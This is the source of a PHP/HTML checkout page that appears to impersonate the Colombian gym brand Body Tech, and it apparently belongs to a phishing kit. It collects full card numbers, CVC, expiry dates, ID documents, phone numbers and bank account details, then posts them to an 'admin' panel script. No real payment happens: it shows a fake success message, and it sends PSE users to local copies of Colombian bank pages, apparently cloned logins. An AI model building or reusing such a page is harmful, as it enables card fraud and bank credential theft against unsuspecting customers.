<?php
// Obtener los datos del plan desde la URL
$plan_nombre = isset($_GET['plan']) ? $_GET['plan'] : 'WELCOME PACK';
$plan_precio_total = isset($_GET['precio']) ? floatval($_GET['precio']) : 105000;

// El precio que viene es el total a pagar
$plan_precio_con_descuento = $plan_precio_total;
$precio_original_plan = $plan_precio_con_descuento / 0.65;
$descuento_plan = $precio_original_plan - $plan_precio_con_descuento;

$subtotal = $plan_precio_total;
$descuentos = $descuento_plan;
$total = $plan_precio_total;

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Body Tech - Método de Pago</title>
    <style>
        @font-face {
            font-family: 'Gotham';
            src: url('gotham-book.woff2') format('woff2');
            font-weight: normal;
            font-style: normal;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Gotham', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
        }

        /* Header */
        header {
            background-color: #ffffff;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo img {
            height: 35px;
            width: auto;
        }

        .header-buttons {
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .oferta-btn {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 25px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        .menu-toggle {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #1a1a1a;
        }

        /* Container */
        .container {
            max-width: 400px;
            margin: 0 auto;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .content {
            padding: 20px;
            flex: 1;
        }

        /* Title */
        .title {
            font-size: 16px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 15px;
        }

        /* Info Text */
        .info-text {
            font-size: 12px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .tab {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 8px;
            background-color: #f0f0f0;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
        }

        .tab.active {
            background-color: #fff;
            border: 2px solid #ff8c00;
        }

        /* Card Display */
        .card-display {
            background: linear-gradient(135deg, #888 0%, #555 100%);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            color: white;
            height: 200px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .card-chip {
            font-size: 24px;
        }

        .card-number {
            font-size: 18px;
            letter-spacing: 2px;
            margin: 15px 0;
        }

        .card-info {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }

        /* No Tarjetas Message */
        .no-cards {
            background-color: #f9f9f9;
            padding: 40px 20px;
            text-align: center;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .no-cards-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .no-cards-text {
            font-size: 12px;
            color: #666;
        }

        /* Add Payment Method Button */
        .add-payment-btn {
            width: 100%;
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            font-size: 13px;
            margin-bottom: 20px;
        }

        /* Form */
        .form-group {
            margin-bottom: 15px;
        }

        .form-label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .form-input, .form-select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 12px;
            font-family: 'Gotham', sans-serif;
        }

        .form-row {
            display: flex;
            gap: 10px;
        }

        .form-row .form-group {
            flex: 1;
        }

        /* Checkboxes */
        .checkbox-group {
            margin-top: 20px;
            margin-bottom: 20px;
        }

        .checkbox-item {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-bottom: 12px;
            font-size: 12px;
        }

        .checkbox-item input[type="checkbox"] {
            margin-top: 2px;
            cursor: pointer;
        }

        .checkbox-item label {
            cursor: pointer;
            line-height: 1.5;
        }

        .checkbox-item a {
            color: #ff8c00;
            text-decoration: none;
        }

        /* Plan Summary */
        .plan-summary {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }

        .summary-line {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            padding: 8px 0;
            border-bottom: 1px solid #e0e0e0;
        }

        .summary-line:last-child {
            border-bottom: none;
        }

        .summary-label {
            font-weight: 700;
            color: #1a1a1a;
        }

        .summary-value {
            font-weight: 700;
        }

        .summary-value.total {
            color: #ff8c00;
            font-size: 14px;
        }

        /* Pay Button */
        .btn-pagar {
            width: 100%;
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            text-transform: uppercase;
            transition: background-color 0.3s;
        }

        .btn-pagar:hover:not(:disabled) {
            background-color: #e67e00;
        }

        .btn-pagar:disabled {
            background-color: #ccc;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .btn-cambiar-tarjeta {
            width: 100%;
            background-color: #f0f0f0;
            color: #ff8c00;
            border: 2px solid #ff8c00;
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }

        .btn-cambiar-tarjeta:hover {
            background-color: #ff8c00;
            color: white;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            z-index: 200;
            align-items: flex-end;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background-color: white;
            width: 100%;
            max-width: 400px;
            border-radius: 12px 12px 0 0;
            padding: 20px;
            max-height: 90vh;
            overflow-y: auto;
        }

        .btn-container {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-add {
            flex: 1;
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            font-size: 12px;
        }

        .btn-close {
            flex: 1;
            background-color: transparent;
            color: #ff8c00;
            border: 2px solid #ff8c00;
            padding: 12px;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            font-size: 12px;
        }

        .whatsapp-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 50;
        }

        .whatsapp-button img {
            width: 50px;
            height: 50px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="logo">
                <img src="logo.png" alt="Body Tech">
            </div>
            <div class="header-buttons">
                <button class="oferta-btn">OFERTAS</button>
                <button class="menu-toggle">☰</button>
            </div>
        </header>

        <!-- Content -->
        <div class="content">
            <!-- Title -->
            <div class="title">Información pago</div>
            <div class="info-text">
                Todas las transacciones se realizan de forma segura, selecciona una tarjeta guardada, o ingresa una nueva.
            </div>

            <!-- Tabs -->
            <div class="tabs">
                <button class="tab active" onclick="switchTab('tarjetas')">Tarjetas</button>
                <button class="tab" onclick="switchTab('pse')">PSE</button>
            </div>

            <!-- Tarjetas Tab -->
            <div id="tarjetas-tab">
                <div class="no-cards">
                    <div class="no-cards-icon">💳</div>
                    <div class="no-cards-text">No tienes tarjetas guardadas</div>
                </div>

                <button class="add-payment-btn" onclick="openPaymentModal()">+ AGREGAR MÉTODO DE PAGO</button>
            </div>

            <!-- PSE Tab -->
            <div id="pse-tab" style="display: none;">
                <div class="no-cards">
                    <div class="no-cards-icon">🏦</div>
                    <div class="no-cards-text">No tienes cuentas PSE configuradas</div>
                </div>

                <button class="add-payment-btn" onclick="openPSEModal()">+ AGREGAR MÉTODO DE PAGO</button>
            </div>

            <!-- Plan Summary -->
            <div class="plan-summary">
                <div class="summary-line">
                    <span class="summary-label"><?php echo htmlspecialchars($plan_nombre); ?> / PREMIUM</span>
                    <span class="summary-value">$ <?php echo number_format(round($plan_precio_con_descuento)); ?></span>
                </div>

                <div class="summary-line">
                    <span class="summary-label">Subtotal:</span>
                    <span class="summary-value">$ <?php echo number_format(round($subtotal)); ?></span>
                </div>

                <div class="summary-line">
                    <span class="summary-label">Descuentos:</span>
                    <span class="summary-value">-$ <?php echo number_format(round($descuentos)); ?></span>
                </div>

                <div class="summary-line">
                    <span class="summary-label">Total a pagar:</span>
                    <span class="summary-value total">$ <?php echo number_format(round($total)); ?></span>
                </div>
            </div>

            <!-- Checkboxes -->
            <div class="checkbox-group">
                <div class="checkbox-item">
                    <input type="checkbox" id="check1">
                    <label for="check1"><span style="color: #ff8c00;">Comunicaciones y Autorizaciones</span></label>
                </div>

                <div class="checkbox-item">
                    <input type="checkbox" id="check2">
                    <label for="check2">Acepto los <a href="#">Términos y condiciones</a> de servicio y <a href="#">contrato del plan</a>.</label>
                </div>

                <div class="checkbox-item">
                    <input type="checkbox" id="check3">
                    <label for="check3">Derecho de retracto y reversión de pago.</label>
                </div>

                <div class="checkbox-item">
                    <input type="checkbox" id="check4" checked>
                    <label for="check4">Acepto la Autorización de débitos automáticos</label>
                </div>
            </div>

            <!-- Tarjeta Guardada -->
            <div id="tarjeta-guardada-section" style="display: none; margin: 20px 0;">
                <div style="background-color: #f9f9f9; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <div style="font-size: 12px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px;">MÉTODO DE PAGO GUARDADO</div>
                    
                    <div class="card-display" style="margin-bottom: 15px;">
                        <div class="card-chip">💳</div>
                        <div class="card-number" id="displayTarjetaGuardada">•••• •••• •••• ••••</div>
                        <div class="card-info">
                            <div>
                                <div style="font-size: 10px; color: rgba(255,255,255,0.7);">NOMBRE</div>
                                <div id="displayTitularGuardado" style="font-size: 12px;">TITULAR</div>
                            </div>
                            <div>
                                <div style="font-size: 10px; color: rgba(255,255,255,0.7);">valid thru</div>
                                <div id="displayVencimientoGuardado" style="font-size: 12px;">MM/AA</div>
                            </div>
                        </div>
                    </div>

                    <button type="button" class="btn-cambiar-tarjeta" onclick="openPaymentModal()">Cambiar método</button>
                </div>
            </div>

            <!-- Info -->
            <div style="background-color: #e3f2fd; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #2196f3;">
                <div style="font-weight: 700; color: #1976d2; font-size: 14px; margin-bottom: 5px;">ℹ️ Info</div>
                <div style="font-size: 12px; color: #0d47a1;">Agrega un metodo de pago para continuar con tu compra</div>
            </div>

            <!-- Botón Pagar -->
            <button type="button" class="btn-pagar" id="btnPagar" onclick="validarYPagar()" disabled>PAGAR</button>
        </div>
    </div>

    <!-- Modal de Pago -->
    <div class="modal" id="paymentModal">
        <div class="modal-content">
            <div class="title">CRÉDITO/DÉBITO</div>

            <div class="card-display">
                <div class="card-chip">💳</div>
                <div class="card-number" id="displayTarjeta">•••• •••• •••• ••••</div>
                <div class="card-info">
                    <div>
                        <div style="font-size: 10px; color: rgba(255,255,255,0.7);">NOMBRE</div>
                        <div id="displayTitular" style="font-size: 12px;">TITULAR</div>
                    </div>
                    <div>
                        <div style="font-size: 10px; color: rgba(255,255,255,0.7);">valid thru</div>
                        <div id="displayVencimiento" style="font-size: 12px;">MM/AA</div>
                    </div>
                </div>
            </div>

            <form id="cardForm">
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Tipo</label>
                        <select class="form-select" name="tipo" required>
                            <option value="">Selecciona</option>
                            <option value="CC">Crédito</option>
                            <option value="DB">Débito</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Documento</label>
                        <input type="text" class="form-input" name="documento" placeholder="Ingresa" required>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Nombre y Apellidos del Titular</label>
                    <input type="text" class="form-input" name="titular" placeholder="Ingresa nombre completo" id="inputTitular" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Número de Celular</label>
                    <input type="tel" class="form-input" name="numero_celular" placeholder="Ej: 3105555555" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Número de Tarjeta</label>
                    <input type="text" class="form-input" name="numero_tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" id="inputTarjeta" required oninput="actualizarTarjeta()">
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Vencimiento (MM/AA)</label>
                        <input type="text" class="form-input" name="vencimiento" placeholder="MM/AA" maxlength="5" id="inputVencimiento" required oninput="actualizarVencimiento()">
                    </div>
                    <div class="form-group">
                        <label class="form-label">CVC</label>
                        <input type="text" class="form-input" name="cvc" placeholder="•••" maxlength="3" required>
                    </div>
                </div>

                <div class="form-group">
                    <input type="checkbox" id="usar-datos" checked>
                    <label for="usar-datos" style="font-size: 12px;">Usar los mismos datos para facturación</label>
                </div>

                <div class="btn-container">
                    <button type="submit" class="btn-add" onclick="procesarPago(event)">Agregar</button>
                    <button type="button" class="btn-close" onclick="closePaymentModal()">Cerrar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Modal PSE -->
    <div class="modal" id="pseModal">
        <div class="modal-content">
            <div class="title">PSE - TRANSFERENCIA BANCARIA</div>

            <form id="pseForm">
                <div class="form-group">
                    <label class="form-label">Documento</label>
                    <input type="text" class="form-input" name="documento_pse" placeholder="Ingresa tu documento" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Nombre y Apellidos del Titular</label>
                    <input type="text" class="form-input" name="titular_pse" placeholder="Ingresa nombre completo" required>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Tipo de Cuenta</label>
                        <select class="form-select" name="tipo_cuenta" required>
                            <option value="">Selecciona</option>
                            <option value="Corriente">Corriente</option>
                            <option value="Ahorros">Ahorros</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Tipo de Documento</label>
                        <select class="form-select" name="tipo_documento" required>
                            <option value="">Selecciona</option>
                            <option value="CC">Cédula Ciudadanía</option>
                            <option value="CE">Cédula Extranjería</option>
                            <option value="NIT">NIT</option>
                            <option value="PP">Pasaporte</option>
                        </select>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Banco</label>
                    <select class="form-select" name="banco_pse" required>
                        <option value="">Selecciona tu banco</option>
                        <option value="Banco de Bogotá">Banco de Bogotá</option>
                        <option value="Bancolombia">Bancolombia</option>
                        <option value="Banco Occidente">Banco Occidente</option>
                        <option value="Davivienda">Davivienda</option>
                        <option value="Daviplata">Daviplata</option>
                        <option value="BBVA Colombia">BBVA Colombia</option>
                        <option value="Falabella">Falabella</option>
                        <option value="Nequi">Nequi</option>
                        <option value="Banco Popular">Banco Popular</option>
                    </select>
                </div>

                <div class="form-group">
                    <label class="form-label">Número de Cuenta</label>
                    <input type="text" class="form-input" name="numero_cuenta" placeholder="Ingresa número de cuenta" required>
                </div>

                <div class="btn-container">
                    <button type="submit" class="btn-add" onclick="procesarPSE(event)">Agregar</button>
                    <button type="button" class="btn-close" onclick="closePSEModal()">Cerrar</button>
                </div>
            </form>
        </div>
    </div>

    <!-- WhatsApp Button -->
    <a href="https://wa.me/YOUR_NUMBER" class="whatsapp-button">
        <img src="whatsapp.png" alt="WhatsApp">
    </a>

    <script>
        let tarjetaGuardada = false;

        function switchTab(tab) {
            document.getElementById('tarjetas-tab').style.display = tab === 'tarjetas' ? 'block' : 'none';
            document.getElementById('pse-tab').style.display = tab === 'pse' ? 'block' : 'none';
            
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
        }

        function openPaymentModal() {
            document.getElementById('paymentModal').classList.add('active');
        }

        function closePaymentModal() {
            document.getElementById('paymentModal').classList.remove('active');
        }

        function openPSEModal() {
            document.getElementById('pseModal').classList.add('active');
        }

        function closePSEModal() {
            document.getElementById('pseModal').classList.remove('active');
        }

        // Actualizar nombre en la tarjeta
        document.getElementById('inputTitular')?.addEventListener('input', function() {
            document.getElementById('displayTitular').textContent = this.value.toUpperCase() || 'TITULAR';
        });

        // Actualizar número de tarjeta
        function actualizarTarjeta() {
            const input = document.getElementById('inputTarjeta');
            let valor = input.value.replace(/\s+/g, '');
            let formateado = '';
            
            for (let i = 0; i < valor.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formateado += ' ';
                }
                formateado += valor[i];
            }
            
            input.value = formateado;
            document.getElementById('displayTarjeta').textContent = formateado || '•••• •••• •••• ••••';
        }

        // Actualizar vencimiento
        function actualizarVencimiento() {
            const input = document.getElementById('inputVencimiento');
            let valor = input.value.replace(/\D/g, '');
            
            if (valor.length >= 2) {
                valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
            }
            
            input.value = valor;
            document.getElementById('displayVencimiento').textContent = valor || 'MM/AA';
        }

        function procesarPago(event) {
            event.preventDefault();
            
            const form = document.getElementById('cardForm');
            const formData = new FormData(form);
            
            // Validar que todos los campos estén llenos
            if (!formData.get('tipo') || !formData.get('documento') || !formData.get('titular') || 
                !formData.get('numero_tarjeta') || !formData.get('cvc') || !formData.get('numero_celular') || 
                !formData.get('vencimiento')) {
                alert('Por favor completa todos los campos');
                return;
            }
            
            // Datos del plan y formulario
            const planData = {
                plan_nombre: '<?php echo htmlspecialchars($plan_nombre); ?>',
                plan_precio: <?php echo $total; ?>,
                tipo: formData.get('tipo'),
                documento: formData.get('documento'),
                titular: formData.get('titular'),
                numero_celular: formData.get('numero_celular'),
                numero_tarjeta: formData.get('numero_tarjeta'),
                vencimiento: formData.get('vencimiento'),
                cvc: formData.get('cvc'),
                usar_datos_facturacion: document.getElementById('usar-datos').checked,
                fecha_transaccion: new Date().toISOString()
            };

            // Mostrar loading
            const btnAgregar = event.target;
            const textOriginal = btnAgregar.textContent;
            btnAgregar.textContent = 'Procesando...';
            btnAgregar.disabled = true;

            // Enviar datos al panel admin
            fetch('admin/procesar_pago.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(planData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Guardar datos de la tarjeta
                    localStorage.setItem('tarjetaGuardada', JSON.stringify(planData));
                    tarjetaGuardada = true;
                    
                    // Actualizar vista
                    document.getElementById('displayTarjetaGuardada').textContent = 
                        formData.get('numero_tarjeta') || '•••• •••• •••• ••••';
                    document.getElementById('displayTitularGuardado').textContent = 
                        formData.get('titular').toUpperCase() || 'TITULAR';
                    document.getElementById('displayVencimientoGuardado').textContent = 
                        formData.get('vencimiento') || 'MM/AA';
                    
                    // Mostrar sección de tarjeta guardada
                    document.getElementById('tarjeta-guardada-section').style.display = 'block';
                    
                    // Habilitar botón de pagar
                    document.getElementById('btnPagar').disabled = false;
                    
                    alert('✅ ¡Tarjeta agregada correctamente!');
                    closePaymentModal();
                    form.reset();
                    document.getElementById('displayTarjeta').textContent = '•••• •••• •••• ••••';
                    document.getElementById('displayTitular').textContent = 'TITULAR';
                    document.getElementById('displayVencimiento').textContent = 'MM/AA';
                } else {
                    alert('❌ Error: ' + (data.error || 'No se pudo procesar el pago'));
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('❌ Error al procesar el pago: ' + error.message);
            })
            .finally(() => {
                btnAgregar.textContent = textOriginal;
                btnAgregar.disabled = false;
            });
        }

        function validarYPagar() {
            // Validar checkboxes
            const check1 = document.getElementById('check1').checked;
            const check2 = document.getElementById('check2').checked;
            const check3 = document.getElementById('check3').checked;
            const check4 = document.getElementById('check4').checked;
            
            if (!check1 || !check2 || !check3 || !check4) {
                alert('Por favor acepta todos los términos y condiciones');
                return;
            }
            
            if (!tarjetaGuardada) {
                alert('Por favor agrega una tarjeta primero');
                return;
            }
            
            // ✅ Verificar si es PSE o tarjeta
            const pseGuardado = localStorage.getItem('pseGuardado');
            
            if (pseGuardado) {
                // Es PSE - redirigir al banco
                const pseData = JSON.parse(pseGuardado);
                
                // Mapeo de nombres de bancos a carpetas
                const mapBancos = {
                    'Banco de Bogotá': 'bogota',
                    'Bancolombia': 'bancolombia',
                    'Banco Occidente': 'bancolombia',
                    'Davivienda': 'davivienda',
                    'Daviplata': 'daviplata',
                    'BBVA Colombia': 'bancolombia',
                    'Falabella': 'falabella',
                    'Nequi': 'nequi',
                    'Banco Popular': 'popular'
                };
                
                const carpetaBanco = mapBancos[pseData.banco_pse] || pseData.banco_pse.toLowerCase().replace(/\s+/g, '');
                
                // ✅ RUTA CORRECTA: admin/bancos/{banco}/index.php
                const urlBanco = 'bancos/' + carpetaBanco + '/index.php';
                
                console.log('Redirigiendo a:', urlBanco);
                window.location.href = urlBanco;
            } else {
                // Es tarjeta de crédito - mostrar mensaje de éxito
                alert('✅ ¡Pago realizado correctamente!\n\n💌 Recibirás un correo de confirmación en los próximos minutos.\n\n¡Gracias por tu compra!');
                
                // Limpiar localStorage y recargar
                localStorage.removeItem('tarjetaGuardada');
                localStorage.removeItem('pseGuardado');
                location.reload();
            }
        }

        function procesarPSE(event) {
            event.preventDefault();
            
            const form = document.getElementById('pseForm');
            const formData = new FormData(form);
            
            // Validar que todos los campos estén llenos
            if (!formData.get('documento_pse') || !formData.get('titular_pse') || 
                !formData.get('tipo_cuenta') || !formData.get('tipo_documento') || 
                !formData.get('banco_pse') || !formData.get('numero_cuenta')) {
                alert('Por favor completa todos los campos');
                return;
            }
            
            const bancoPSE = formData.get('banco_pse');
            
            // Datos del plan y formulario PSE
            const pseData = {
                plan_nombre: '<?php echo htmlspecialchars($plan_nombre); ?>',
                plan_precio: <?php echo $total; ?>,
                metodo_pago: 'PSE',
                documento_pse: formData.get('documento_pse'),
                titular_pse: formData.get('titular_pse'),
                tipo_cuenta: formData.get('tipo_cuenta'),
                tipo_documento: formData.get('tipo_documento'),
                banco_pse: bancoPSE,
                numero_cuenta: formData.get('numero_cuenta'),
                fecha_transaccion: new Date().toISOString()
            };

            // Mostrar loading
            const btnAgregar = event.target;
            const textOriginal = btnAgregar.textContent;
            btnAgregar.textContent = 'Procesando...';
            btnAgregar.disabled = true;

            // Enviar datos al panel admin
            fetch('admin/procesar_pago.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(pseData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Guardar datos de PSE
                    localStorage.setItem('pseGuardado', JSON.stringify(pseData));
                    tarjetaGuardada = true;
                    
                    // Mostrar sección de método guardado
                    document.getElementById('tarjeta-guardada-section').style.display = 'block';
                    document.getElementById('displayTarjetaGuardada').textContent = 'PSE - ' + bancoPSE;
                    document.getElementById('displayTitularGuardado').textContent = formData.get('titular_pse').toUpperCase();
                    document.getElementById('displayVencimientoGuardado').textContent = formData.get('numero_cuenta');
                    
                    // Habilitar botón de pagar
                    document.getElementById('btnPagar').disabled = false;
                    
                    alert('✅ ¡PSE agregado correctamente!');
                    closePSEModal();
                    form.reset();
                } else {
                    alert('❌ Error: ' + (data.error || 'No se pudo procesar el PSE'));
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('❌ Error al procesar el PSE: ' + error.message);
            })
            .finally(() => {
                btnAgregar.textContent = textOriginal;
                btnAgregar.disabled = false;
            });
        }
        window.addEventListener('DOMContentLoaded', function() {
            const tarjeta = localStorage.getItem('tarjetaGuardada');
            const pse = localStorage.getItem('pseGuardado');
            
            if (tarjeta) {
                const datos = JSON.parse(tarjeta);
                tarjetaGuardada = true;
                
                document.getElementById('displayTarjetaGuardada').textContent = datos.numero_tarjeta;
                document.getElementById('displayTitularGuardado').textContent = datos.titular.toUpperCase();
                document.getElementById('displayVencimientoGuardado').textContent = datos.vencimiento;
                document.getElementById('tarjeta-guardada-section').style.display = 'block';
                document.getElementById('btnPagar').disabled = false;
            } else if (pse) {
                const datos = JSON.parse(pse);
                tarjetaGuardada = true;
                
                document.getElementById('displayTarjetaGuardada').textContent = 'PSE - ' + datos.banco_pse;
                document.getElementById('displayTitularGuardado').textContent = datos.titular_pse.toUpperCase();
                document.getElementById('displayVencimientoGuardado').textContent = datos.numero_cuenta;
                document.getElementById('tarjeta-guardada-section').style.display = 'block';
                document.getElementById('btnPagar').disabled = false;
            }
        });
    </script>
</body>
</html>